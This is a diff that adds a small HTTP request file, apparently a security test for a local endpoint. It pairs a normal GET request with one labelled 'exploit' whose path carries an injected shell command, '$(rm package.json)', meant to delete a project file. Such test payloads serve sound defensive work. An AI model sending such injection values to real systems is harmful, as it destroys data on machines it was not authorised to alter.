@@ -1,0 +1,6 @@
+# normal
+GET http://localhost:3000/test066/jane HTTP/1.1
+
+###
+# exploit
+GET http://localhost:3000/test066/jane$(rm package.json) HTTP/1.1
